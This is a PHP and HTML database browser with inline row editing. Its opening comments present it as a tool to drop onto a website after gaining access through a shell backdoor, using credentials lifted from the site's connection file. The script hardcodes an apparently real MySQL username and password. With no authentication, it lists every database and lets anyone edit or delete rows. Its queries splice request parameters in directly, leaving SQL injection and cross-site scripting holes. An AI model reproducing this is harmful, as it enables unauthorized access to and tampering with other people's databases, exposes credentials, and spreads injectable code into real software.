// This is a php script that helps to vieww the database structure of the file. You just need to give the credentials of the mysql(usrname, passwd, dbname). It will display the database, tables, columns and its data in structured and ordered manner.
// After gaining access to a website through a shell backdoor, you can see the websites's files and there may be a file for connection in website. You can get credentials from there
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Database Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        table {
            border-collapse: collapse;
            width: 100%;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        .edit-input {
            width: 80%;
        }
    </style>
</head>
<body>

<?php
$dbCon = mysqli_connect("localhost", "rnarlnmuac_web", "t@c55#143CO", "rnarlnmuac_web");

if (!$dbCon) {
    die("Connection failed: " . mysqli_connect_error());
}

// Handle inline editing
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['action'])) {
    $action = $_POST['action'];

    if ($action === 'edit') {
        $id = $_POST['id'];
        $column = $_POST['column'];
        $value = $_POST['value'];

        $update_query = "UPDATE $selectedTable SET $column = '$value' WHERE id = $id";
        mysqli_query($dbCon, $update_query);
        exit();
    } elseif ($action === 'delete') {
        $id = $_POST['id'];

        $delete_query = "DELETE FROM $selectedTable WHERE id = $id";
        mysqli_query($dbCon, $delete_query);
        exit();
    }
}

// Fetch databases
$result = mysqli_query($dbCon, "SHOW DATABASES");
if ($result) {
    while ($row = mysqli_fetch_assoc($result)) {
        $database = $row["Database"];
        echo "<h2>$database</h2>";

        // Fetch tables
        $result_tables = mysqli_query($dbCon, "SHOW TABLES FROM $database");
        if ($result_tables) {
            echo "<table>";
            echo "<tr><th>Table</th></tr>";
            while ($row_tables = mysqli_fetch_assoc($result_tables)) {
                $table = $row_tables["Tables_in_$database"];
                echo "<tr><td><a href='?db=$database&table=$table'>$table</a></td></tr>";
            }
            echo "</table>";
        }
    }
}

if (isset($_GET['db']) && isset($_GET['table'])) {
    $selectedDB = $_GET['db'];
    $selectedTable = $_GET['table'];

    echo "<h3>Database: $selectedDB</h3>";
    echo "<h3>Table: $selectedTable</h3>";

    // Fetch columns
    $result_columns = mysqli_query($dbCon, "SHOW COLUMNS FROM $selectedTable");
    if ($result_columns) {
        echo "<table>";
        echo "<tr><th>Column</th></tr>";
        while ($row_columns = mysqli_fetch_assoc($result_columns)) {
            $column = $row_columns["Field"];
            echo "<tr><td>$column</td></tr>";
        }
        echo "</table>";
    }

    // Fetch data
    $result_data = mysqli_query($dbCon, "SELECT * FROM $selectedTable");
    if ($result_data) {
        echo "<h3>Data:</h3>";
        echo "<table>";
        echo "<tr><th>Action</th>";
        while ($row_data = mysqli_fetch_assoc($result_data)) {
            foreach ($row_data as $key => $value) {
                echo "<th>$key</th>";
            }
            break;
        }
        echo "</tr>";
        mysqli_data_seek($result_data, 0); // Reset the result set pointer
        while ($row_data = mysqli_fetch_assoc($result_data)) {
            $id = $row_data['id']; // Assuming 'id' is the primary key
            echo "<tr>";
            echo "<td>
                    <button onclick='editRow($id)'>Edit</button>
                    <button onclick='deleteRow($id)'>Delete</button>
                  </td>";
            foreach ($row_data as $key => $value) {
                echo "<td id='cell-$id-$key'>$value</td>";
            }
            echo "</tr>";
        }
        echo "</table>";
    }
}
?>

<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
<script>
    function editRow(id) {
        $('td[id^="cell-' + id + '"]').each(function () {
            let columnName = $(this).attr('id').split('-')[2];
            let columnValue = $(this).text();
            $(this).html(`<input class="edit-input" type="text" id="edit-${id}-${columnName}" value="${columnValue}">`);
        });

        // Add save button
        $(`#cell-${id}-id`).parent().append(`
            <button onclick="saveRow(${id})">Save</button>
            <button onclick="cancelEdit(${id})">Cancel</button>
        `);
    }

    function saveRow(id) {
        $('td[id^="cell-' + id + '"]').each(function () {
            let columnName = $(this).attr('id').split('-')[2];
            let newValue = $(`#edit-${id}-${columnName}`).val();
            $(this).html(newValue);
            // Send AJAX request to update value in the database
            updateDatabase(id, columnName, newValue);
        });
    }

    function cancelEdit(id) {
        $('td[id^="cell-' + id + '"]').each(function () {
            let columnName = $(this).attr('id').split('-')[2];
            let originalValue = $(this).text();
            $(this).html(originalValue);
        });
    }

    function deleteRow(id) {
        // Send AJAX request to delete row from the database
        if (confirm('Are you sure you want to delete this row?')) {
            deleteFromDatabase(id);
            $(`tr:has(td:contains("${id}"))`).remove();
        }
    }

    function updateDatabase(id, column, value) {
        $.ajax({
            type: 'POST',
            url: window.location.href,
            data: {
                action: 'edit',
                id: id,
                column: column,
                value: value
            },
            success: function (response) {
                console.log(response);
            }
        });
    }

    function deleteFromDatabase(id) {
        $.ajax({
            type: 'POST',
            url: window.location.href,
            data: {
                action: 'delete',
                id: id
            },
            success: function (response) {
                console.log(response);
            }
        });
    }
</script>

</body>
</html>
